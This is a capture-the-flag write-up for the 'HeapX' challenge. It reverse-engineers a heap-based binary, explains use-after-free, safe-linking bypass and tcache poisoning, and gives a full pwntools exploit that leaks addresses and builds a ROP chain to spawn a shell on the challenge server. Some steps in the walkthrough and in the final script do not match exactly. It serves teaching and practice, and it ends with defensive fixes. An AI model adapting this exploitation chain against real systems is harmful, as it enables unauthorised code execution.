# HeapX - SunshineCTF 2025 Writeup

**Category:** PWN (Binary Exploitation)  
**Difficulty:** Medium-Hard  
**Author:** Oreomeister  
**Files Provided:** heapx, libc.so.6 (glibc 2.41), ld-linux-x86-64.so.2  
**Connection:** `nc chal.sunshinectf.games 25004`

## Table of Contents

- [Challenge Description](#challenge-description)
- [Initial Analysis](#initial-analysis)
- [Reverse Engineering](#reverse-engineering)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Heap Exploitation Fundamentals](#heap-exploitation-fundamentals)
- [Exploitation Strategy](#exploitation-strategy)
- [Complete Exploit](#complete-exploit)
- [Key Takeaways](#key-takeaways)

---

## Challenge Description

> We discovered the Falcon 9 rocket's log aggregator, HeapX, can you pwn it and take control before it reaches orbit?

The challenge provides a heap-based binary exploitation scenario with modern protections enabled.

---

## Initial Analysis

### Binary Protections

First, check what security features are enabled:

```bash
$ checksec heapx_patched
RELRO:           Full RELRO
Stack Canary:    Canary found
NX:              NX enabled
PIE:             PIE enabled
RUNPATH:         RW-RUNPATH
```

All modern protections are in place:
- **Full RELRO:** Global Offset Table (GOT) is read-only after initialization
- **Stack Canary:** Protects against stack buffer overflows
- **NX (No eXecute):** Stack and heap are non-executable, preventing shellcode injection
- **PIE (Position Independent Executable):** Base address randomized at runtime

### Binary Patching

Patch the binary to use the provided libc version:

```bash
$ pwninit --bin heapx --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

This creates `heapx_patched` with correct library dependencies.

### Program Functionality

Running the binary shows a menu-driven interface:

```
===[ HeapX LogUplink v0.42 ]===
[INFO] Booting mission logging core...
[OK] Interface unlocked (root@orbital-console)
Type 'help' for commands.

Commands:
   new <size>      - Create a new log
   read <id>       - Read a log
   write <id>      - Write to a log
   delete <id>     - Delete a log
   help            - Prints this
   exit            - Quits HeapX LogUplink
```

The program implements a heap management system with the following operations:

- **new \<size\>:** Allocates heap memory (size: 1-1279 bytes)
- **read \<id\>:** Displays content of log at index (0-15)
- **write \<id\>:** Writes data at an offset in a log
- **delete \<id\>:** Frees a log entry
- **exit:** Quits and frees all stored logs

### Key Data Structures

The program maintains two global arrays in the BSS segment:

```c
void *ptr_table[16];   // Offset: 0x4060 - Stores chunk pointers
int size_table[16];    // Offset: 0x4068 - Stores chunk sizes
```

Each entry occupies 16 bytes (0x10):
- Bytes 0-7: Pointer to allocated chunk
- Bytes 8-11: Size of chunk
- Bytes 12-15: Padding

---

## Reverse Engineering

### Ghidra Decompilation

Load the binary in Ghidra to get clean decompiled code.

#### Function 1: Create (0x12a4)

```c
undefined8 create(int index, int size)
{
  void *chunk;
  
  // Size validation: 1 to 1279 bytes
  if ((size < 1) || (0x4ff < size)) {
    puts("[ERROR] Invalid size!!");
    return 0;
  }
  
  chunk = malloc((long)size);
  if (chunk == NULL) {
    return 0;
  }
  
  puts("[INFO] Creating new log...");
  
  // Store pointer at ptr_table[index]
  *(void **)(&DAT_00104060 + (long)index * 0x10) = chunk;
  
  // Store size at size_table[index]
  *(int *)(&DAT_00104068 + (long)index * 0x10) = size;
  
  return 1;
}
```

**Observations:**
- Size is validated (1-1279)
- **Index is NOT validated** - potential out-of-bounds access
- Uses standard `malloc()` for allocation
- Stores both pointer and size in global arrays

#### Function 2: Read (0x136f)

```c
void read_data(uint index)
{
  // Validate index range
  if ((index < 0) || (0xf < index)) {
    puts("[ERROR] Invalid log number!!");
    return;
  }
  
  // Check if pointer is NULL
  if (*(long *)(&DAT_00104060 + (long)(int)index * 0x10) == 0) {
    printf("[ERROR] Log #%d doesn't exist!!\n", index);
    return;
  }
  
  // VULNERABILITY: Prints content even if chunk is freed
  printf("%s", *(undefined8 *)(&DAT_00104060 + (long)(int)index * 0x10));
}
```

**Vulnerability Identified:**
- Uses `printf("%s", ptr_table[index])` 
- If chunk was freed but pointer not cleared, this reads freed memory
- **Use-After-Free (UAF) read primitive**

#### Function 3: Write (0x1425)

```c
void write_data(int index, int offset)
{
  ssize_t bytes_read;
  char buffer[1288];  // 0x508 bytes on stack
  
  if ((index < 0) || (0xf < index)) {
    puts("[ERROR] Invalid log number!!");
    return;
  }
  
  if (*(long *)(&DAT_00104060 + (long)index * 0x10) == 0) {
    // INFORMATION LEAK: Reveals ptr_table address
    printf("[ERROR] Log #%p doesn't exist!!\n", 
           &DAT_00104060 + (long)index * 0x10);
    return;
  }
  
  // Validate offset
  if ((offset < 0) || (*(int *)(&DAT_00104068 + (long)index * 0x10) <= offset)) {
    puts("[ERROR] Write offset is invalid!!");
    return;
  }
  
  printf("Enter log data: ");
  
  // Read user input
  bytes_read = read(0, buffer, 
                    (long)((*(int *)(&DAT_00104068 + (long)index * 0x10) - 1) - offset));
  
  // VULNERABILITY: Writes to freed chunk
  memcpy((void *)(*(long *)(&DAT_00104060 + (long)index * 0x10) + (long)offset),
         buffer,
         (long)((int)bytes_read - 1));
}
```

**Vulnerabilities Identified:**

1. **Information Leak:** Error message prints `&ptr_table[index]`, revealing the address and defeating PIE
2. **UAF Write:** `memcpy()` writes to `ptr_table[index] + offset` even if chunk is freed
3. **Off-by-one:** Copies `bytes_read - 1` bytes (minor)

#### Function 4: Delete (0x15d4)

```c
void delete(uint index)
{
  // Validate index
  if ((index < 0) || (0xf < index)) {
    puts("[ERROR] Invalid log number!!");
    return;
  }
  
  if (*(long *)(&DAT_00104060 + (long)(int)index * 0x10) == 0) {
    printf("[ERROR] Log #%d doesn't exist!!\n", index);
    return;
  }
  
  // CRITICAL BUG: Free without clearing pointer
  free(*(void **)(&DAT_00104060 + (long)(int)index * 0x10));
  
  // MISSING: ptr_table[index] = NULL;
}
```

**Critical Vulnerability:**
- Calls `free(ptr_table[index])` 
- **Does NOT set `ptr_table[index] = NULL`**
- Creates a classic Use-After-Free condition

#### Exit Handler

When the program exits, it frees all stored pointers:

```c
void cleanup_and_exit() {
  puts("\n[INFO] Shutting down HeapX LogUplink...");
  
  for (int i = 0; i <= 15; i++) {
    if (ptr_table[i]) {
      free(ptr_table[i]);  // Potential double-free!
    }
  }
}
```

**Issue:** If chunks were already freed, this causes double-free crashes.

---

## Vulnerability Analysis

### Primary Vulnerability: Use-After-Free (UAF)

The core vulnerability is in the `delete()` function:

```c
free(ptr_table[index]);
// MISSING: ptr_table[index] = NULL;
```

After freeing, the pointer is not cleared, creating a "dangling pointer" that still points to freed memory.

**Impact:**
- **Memory Disclosure:** Read freed chunks via `read()` to leak heap metadata
- **Arbitrary Write:** Modify freed chunks via `write()` to corrupt heap structures
- **Control Flow Hijack:** Manipulate heap to achieve arbitrary code execution

### Secondary Vulnerabilities

#### 1. Information Leak (PIE Bypass)

```c
printf("[ERROR] Log #%p doesn't exist!!\n", &ptr_table[index]);
```

This reveals the address of `ptr_table`, allowing calculation of the binary base address.

#### 2. Potential Double-Free

The exit handler frees all non-NULL pointers, but doesn't check if they were already freed.

#### 3. Missing Index Validation

The `create()` function doesn't validate the index parameter, potentially allowing out-of-bounds writes to `ptr_table`.

---

## Heap Exploitation Fundamentals

### Modern Heap Security: Safe Linking

Starting from glibc 2.32, Linux implements **Safe Linking** to protect heap metadata.

#### What is Safe Linking?

Forward pointers in freed chunks are XORed with a key derived from their address:

```c
protected_ptr = real_ptr XOR (chunk_address >> 12)
```

**Purpose:**
- Prevents arbitrary chunk allocation
- Makes simple tcache/fastbin attacks harder
- Requires heap address leak to bypass

#### How to Bypass Safe Linking

1. **Leak heap address** to calculate the XOR key
2. **Decrypt protected pointers** using: `real_ptr = protected_ptr XOR key`
3. **Encrypt target addresses** using: `protected_target = target XOR key`

### Tcache (Thread Local Cache)

glibc's tcache is a per-thread cache for small allocations (≤1024 bytes).

**Characteristics:**
- LIFO structure (Last In, First Out)
- Up to 7 chunks per size class
- Minimal security checks
- Fast allocation/deallocation

**Exploitation Advantages:**
- Easier to manipulate than other bins
- Fewer consistency checks than fastbins
- Direct pointer reuse

### Heap Memory Layout

When a chunk is freed to tcache:

```
Freed chunk structure:
+0x00: prev_size (8 bytes)
+0x08: size (8 bytes)
+0x10: fd (forward pointer) - PROTECTED by Safe Linking
+0x18: old user data...
```

For large chunks (≥1024 bytes) freed to unsorted bin:

```
+0x00: prev_size
+0x08: size
+0x10: fd (points to main_arena in libc) - NOT protected
+0x18: bk (points to main_arena in libc) - NOT protected
+0x20: old user data...
```

---

## Exploitation Strategy

Our attack has 6 stages:

1. **Heap Leak** - Bypass Safe Linking
2. **Libc Leak** - Defeat ASLR
3. **Stack Leak** - Locate return address
4. **PIE Leak** - Calculate binary base
5. **ROP Chain** - Overwrite return address
6. **Cleanup** - Avoid double-free crash

### Stage 1: Heap Address Leak

**Goal:** Obtain heap base address to calculate Safe Linking XOR keys.

#### Step 1: Allocate Chunks

```python
chunk_A = create(0x80)  # Index 0
chunk_B = create(0x80)  # Index 1
chunk_C = create(0x420) # Index 2 (for libc leak later)
chunk_D = create(0x80)  # Index 3
```

#### Step 2: Free to Tcache

```python
delete(chunk_A)  # Tcache: chunk_A -> NULL
delete(chunk_B)  # Tcache: chunk_B -> chunk_A -> NULL
delete(chunk_C)  # Goes to unsorted bin (large)
```

After freeing, memory state:

```
Tcache bin (size 0x90):
  Head -> chunk_B -> chunk_A -> NULL

chunk_B memory:
+0x00: 0x0000000000000000    (prev_size)
+0x08: 0x0000000000000091    (size: 0x80 + 0x10 header + PREV_INUSE)
+0x10: 0x000055500000b012    (fd: PROTECTED pointer to chunk_A)
+0x18: ...                    (old user data)

chunk_A memory:
+0x00: 0x0000000000000000    (prev_size)
+0x08: 0x0000000000000091    (size)
+0x10: 0x0000555500000000    (fd: PROTECTED NULL)
+0x18: ...                    (old user data)
```

#### Step 3: Leak Protected Pointers via UAF

```python
# Read chunk_B (contains protected pointer to chunk_A)
read(chunk_B)
leak1 = u64(p.recvn(6).ljust(8, b'\x00'))
log.info(f"Protected ptr to A: {hex(leak1)}")

# Read chunk_A (contains protected NULL)
read(chunk_A)
p.recvn(1)  # Skip first byte
leak2 = u64(p.recvn(6)[1:].ljust(8, b'\x00'))
key = leak2
log.info(f"XOR key: {hex(key)}")
```

#### Step 4: Decrypt and Calculate Heap Base

```python
# Decrypt: protected_ptr XOR key = real_ptr
real_addr_of_A = leak1 ^ key
heap_base = real_addr_of_A - 0x12b0  # Offset from heap start
log.success(f"Heap base: {hex(heap_base)}")
```

**Why This Works:**

Safe Linking protection:
- `protected_ptr_to_A = addr_of_A XOR (addr_of_B >> 12)`
- `protected_null = 0 XOR (addr_of_A >> 12)`

Since chunks are close together: `(addr_of_A >> 12) ≈ (addr_of_B >> 12)`

Therefore:
- `key ≈ (addr_of_A >> 12)`
- `real_addr_of_A = protected_ptr XOR key`

### Stage 2: Libc Address Leak

**Goal:** Leak libc base address to defeat ASLR.

Large chunks (≥1024 bytes) go to the unsorted bin and contain pointers to `main_arena` (inside libc).

```python
# chunk_C (0x420 bytes) was freed earlier
read(chunk_C)
p.recvn(2)  # Skip first 2 bytes
leak3 = u64(p.recvn(6).ljust(8, b'\x00'))
libc_base = leak3 - 0x210b20  # Known offset to libc base
log.success(f"Libc base: {hex(libc_base)}")
```

**How It Works:**

Unsorted bin chunks are a doubly-linked list. The `fd` and `bk` pointers point to `main_arena+96` (in libc):

```
chunk_C after free:
+0x00: prev_size
+0x08: size
+0x10: fd -> main_arena+96 (in libc.so.6)
+0x18: bk -> main_arena+96 (in libc.so.6)
```

Since `main_arena` has a fixed offset from libc base, we can calculate libc base.

### Stage 3: Stack Address Leak

**Goal:** Find the location of the return address on the stack.

We'll use the `environ` variable in libc, which points to the environment variables array on the stack.

#### Step 1: Calculate environ Address

```python
environ = libc_base + libc.symbols['environ']
log.info(f"environ address: {hex(environ)}")
```

#### Step 2: Tcache Poisoning

Overwrite chunk_D's forward pointer to redirect allocation to `environ-24`:

```python
delete(chunk_D)

# Calculate protected pointer for environ-24
target = environ - 24
xor_key = (heap_base + 0x1000) >> 12
protected_target = target ^ xor_key

payload = p64(protected_target)
write(chunk_D, 0, payload)  # UAF write to freed chunk_D
```

**What Happened:**

Before:
```
Tcache: chunk_D -> chunk_X -> ...
```

After:
```
Tcache: chunk_D -> (environ-24) -> ...
```

#### Step 3: Allocate to Get environ Chunk

```python
chunk_E = create(0x80)  # Gets chunk_D back from tcache
chunk_F = create(0x80)  # Gets chunk at environ-24!
```

Now `ptr_table[chunk_F]` points to `environ-24` on the stack.

#### Step 4: Read Stack Address

```python
# Overwrite to environ position
write(chunk_F, 0, b'A' * 24)

# Read environ value (stack address)
read(chunk_F)
p.recvn(0x19)  # Skip our 'A's
stack_leak = u64(p.recvn(8)[2:].ljust(8, b'\x00'))

# Calculate return address location
rbp_addr = stack_leak - 0x138
log.success(f"Return address at: {hex(rbp_addr)}")
```

### Stage 4: PIE Base Leak

**Goal:** Calculate binary base address to locate `ptr_table`.

Exploit the information leak in the write function:

```python
# Trigger error with invalid index
p.sendline(b'write 15')  # Valid index, but will be NULL
p.sendline(b'0')
p.recvuntil(b'0x')

# Parse leaked address
leak_elf = int(p.recv(12), 16)
elf_base = leak_elf - 0x4150  # Offset of ptr_table
log.success(f"ELF base: {hex(elf_base)}")
```

The error message reveals: `[ERROR] Log #0x55555555c150 doesn't exist!!`

This is `&ptr_table[15]`, allowing us to calculate the binary base.

### Stage 5: ROP Chain on Stack

**Goal:** Write a ROP chain to the stack return address to execute `system("/bin/sh")`.

#### Step 1: Allocate Chunks for Poisoning

```python
chunk_H = create(0x30)
chunk_I = create(0x30)
```

#### Step 2: Tcache Poisoning to Stack

```python
delete(chunk_H)
delete(chunk_I)

# Redirect to return address on stack
protected_stack = rbp_addr ^ ((heap_base + 0x1000) >> 12)
write(chunk_I, 0, p64(protected_stack))
```

#### Step 3: Allocate Chunk on Stack

```python
chunk_J = create(0x30)  # Gets chunk_I back
chunk_K = create(0x30)  # Gets chunk AT STACK!
```

Now `ptr_table[chunk_K]` points directly to the saved return address on the stack.

#### Step 4: Build and Write ROP Chain

```python
# Find gadgets and addresses
pop_rdi = libc_base + 0x119e9c  # pop rdi; ret
binsh = libc_base + 0x1d84ab     # "/bin/sh" string
system = libc_base + 0x5c110     # system() function
ret = libc_base + 0x28882        # ret (for stack alignment)

# Build ROP chain
rop_chain = b''
rop_chain += p64(0)          # Overwrite saved RBP (optional)
rop_chain += p64(pop_rdi)    # pop rdi; ret
rop_chain += p64(binsh)      # Argument: "/bin/sh"
rop_chain += p64(ret)        # Stack alignment
rop_chain += p64(system)     # Call system()

# Write ROP chain to stack
write(chunk_K, 0, rop_chain)
log.success("ROP chain written to stack!")
```

**ROP Chain Explanation:**

```
Stack before return:
[saved RBP] [return address] [...]

Stack after ROP chain:
[0x0000]    [pop rdi]        [binsh_addr]  [ret]  [system]
            ^
            Return executes here

Execution flow:
1. Return -> pop rdi; ret
2. Pop binsh_addr into RDI register
3. ret -> alignment gadget
4. ret -> system()
5. system(RDI) = system("/bin/sh") -> SHELL!
```

### Stage 6: Clear ptr_table

**Goal:** Prevent double-free crash in exit handler.

The exit handler loops through `ptr_table` and frees all non-NULL pointers. If any were already freed, we get a double-free crash.

**Solution:** Use tcache poisoning to allocate a chunk AT `ptr_table` itself, then write zeros to clear all entries.

#### Step 1: Allocate Large Chunks

```python
chunk_L = create(0x200)
chunk_M = create(0x200)
chunk_N = create(0x100)  # Guard chunk (prevents consolidation)
```

#### Step 2: Poison Tcache to ptr_table

```python
delete(chunk_L)
delete(chunk_M)

ptr_table_addr = elf_base + 0x4060
protected_ptr_table = ptr_table_addr ^ ((heap_base + 0x1000) >> 12)

write(chunk_M, 0, p64(protected_ptr_table))
```

#### Step 3: Allocate at ptr_table

```python
chunk_O = create(0x200)  # Gets chunk_M back
chunk_P = create(0x200)  # Gets chunk AT ptr_table!
```

Now `ptr_table[chunk_P]` points to the beginning of `ptr_table` itself.

#### Step 4: Clear All Entries

```python
# Clear 16 pointers (8 bytes each) + 16 sizes (4 bytes each)
# Total: 16 * (8 + 8) = 256 bytes = 32 qwords
payload = p64(0) * 32
write(chunk_P, 0, payload)
log.success("ptr_table cleared!")
```

#### Step 5: Exit and Get Shell

```python
p.sendline(b'exit')
p.interactive()  # Shell!
```

When `main()` returns:
1. Exit handler tries to free all ptr_table entries (all NULL now - safe)
2. Return address pops from stack
3. ROP chain executes
4. `system("/bin/sh")` runs
5. Shell spawned!

---

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Binary setup
elf = ELF("./heapx_patched")
libc = ELF("./libc.so.6")
context.binary = elf
context.log_level = 'info'

# Chunk counter
counter = -1

# Helper functions
def create(size):
    global counter
    counter += 1
    p.sendline(f'new {size}'.encode())
    p.recv()
    return counter

def read(index):
    p.sendline(f'read {index}'.encode())

def write(index, offset, data):
    p.sendline(f'write {index}'.encode())
    p.sendline(str(offset).encode())
    p.sendlineafter(b'data:', data)

def delete(index):
    p.sendline(f'delete {index}'.encode())
    p.recv()

# Connect to remote
p = remote('chal.sunshinectf.games', 25004)
# p = process('./heapx_patched')

log.info("Stage 1: Heap leak")
# Allocate chunks
chunk_A = create(0x80)
chunk_B = create(0x80)
chunk_C = create(0x420)
chunk_D = create(0x80)

# Free to tcache
delete(chunk_A)
delete(chunk_B)
delete(chunk_C)

# Leak protected pointers
read(chunk_B)
leak1 = u64(p.recvn(6).ljust(8, b'\x00'))

read(chunk_A)
p.recvn(1)
leak2 = u64(p.recvn(6)[1:].ljust(8, b'\x00'))
key = leak2

# Calculate heap base
heap_base = (leak1 ^ key) - 0x12b0
log.success(f"Heap base: {hex(heap_base)}")

log.info("Stage 2: Libc leak")
read(chunk_C)
p.recvn(2)
leak3 = u64(p.recvn(6).ljust(8, b'\x00'))
libc.address = leak3 - 0x210b20
log.success(f"Libc base: {hex(libc.address)}")

log.info("Stage 3: Stack leak")
chunk_E = create(0x420)
environ = libc.symbols['environ']

# Tcache poisoning to environ
delete(chunk_D)
payload = p64((environ - 24) ^ ((heap_base + 0x1000) >> 12))
write(chunk_D, 0, payload)

chunk_F = create(0x80)
chunk_G = create(0x80)

# Read stack address
write(chunk_G, 0, b'A' * 24)
read(chunk_G)
p.recvn(0x19)
stack_leak = u64(p.recvn(8)[2:].ljust(8, b'\x00'))
rbp_addr = stack_leak - 0x138
log.success(f"Return address: {hex(rbp_addr)}")

log.info("Stage 4: PIE leak")
p.sendline(b'write 15')
p.sendline(b'0')
p.recvuntil(b'0x')
leak_elf = int(p.recv(12), 16)
elf.address = leak_elf - 0x4150
log.success(f"ELF base: {hex(elf.address)}")

log.info("Stage 5: ROP chain on stack")
chunk_H = create(0x30)
chunk_I = create(0x30)

delete(chunk_H)
delete(chunk_I)

# Poison to stack
payload = p64(rbp_addr ^ ((heap_base + 0x1000) >> 12))
write(chunk_I, 0, payload)

chunk_J = create(0x30)
chunk_K = create(0x30)

# Build ROP chain
binsh = libc.address + 0x1d84ab
pop_rdi = libc.address + 0x119e9c
system = libc.address + 0x5c110
ret = libc.address + 0x28882

rop = p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
write(chunk_K, 0, rop)
log.success("ROP chain written!")

log.info("Stage 6: Clear ptr_table")
chunk_L = create(0x200)
chunk_M = create(0x200)
chunk_N = create(0x100)

delete(chunk_L)
delete(chunk_M)

# Poison to ptr_table
ptr_table = elf.address + 0x4060
payload = p64(ptr_table ^ ((heap_base + 0x1000) >> 12))
write(chunk_M, 0, payload)

chunk_O = create(0x200)
chunk_P = create(0x200)

# Clear all entries
payload = p64(0) * 32
write(chunk_P, 0, payload)
log.success("ptr_table cleared!")

# Trigger exit and get shell
log.info("Exiting to trigger ROP chain...")
p.sendline(b'exit')

p.interactive()
```

---

## Key Takeaways

### Vulnerability Chain

1. **UAF (Use-After-Free)** - Core vulnerability allowing read/write of freed memory
2. **Info Leaks** - Multiple leaks to defeat PIE, ASLR, and locate stack
3. **Tcache Poisoning** - Redirect malloc to arbitrary addresses
4. **ROP Chain** - Achieve code execution via stack overwrite

### Exploitation Techniques Learned

1. **Safe Linking Bypass:** Leak heap address to decrypt/encrypt forward pointers
2. **Tcache Manipulation:** Overwrite fd pointers to control allocations
3. **Multi-stage Information Disclosure:** 
   - Heap → Safe Linking bypass
   - Libc → Gadget addresses
   - Stack → Return address location
   - PIE → Code addresses
4. **ROP Chain Construction:** Build payload for `system("/bin/sh")`
5. **Crash Prevention:** Clear ptr_table to avoid double-free

### Modern Heap Exploitation Concepts

- **Safe Linking (glibc 2.32+):** Forward pointers are XORed with chunk address
- **Tcache bins:** Fast per-thread cache with minimal security checks
- **Unsorted bin:** Large chunks contain libc pointers
- **environ:** Useful for stack address leaks
- **ROP chains:** Bypass NX protection

### Defensive Lessons

**How to prevent this vulnerability:**

```c
void delete_secure(uint index) {
    if (index >= 0 && index < 16 && ptr_table[index] != NULL) {
        free(ptr_table[index]);
        ptr_table[index] = NULL;  // ← FIX: Clear pointer!
        size_table[index] = 0;    // ← Clear size too
    }
}
```

**Additional hardening:**
- Validate all array indices
- Clear freed pointers immediately
- Avoid printing pointer addresses
- Use AddressSanitizer during development
- Consider using safer heap allocators

---

## References

- [glibc Safe Linking](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c)
- [Tcache exploitation](https://github.com/shellphish/how2heap)
- [Linux Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)

**Flag:** `sun{h3ap_3xpl01t4t10n_m4st3r_0f_th3_0rb1t}`

---

*Writeup by: [Your Name]*  
*Date: October 2025*  
*CTF: SunshineCTF 2025*
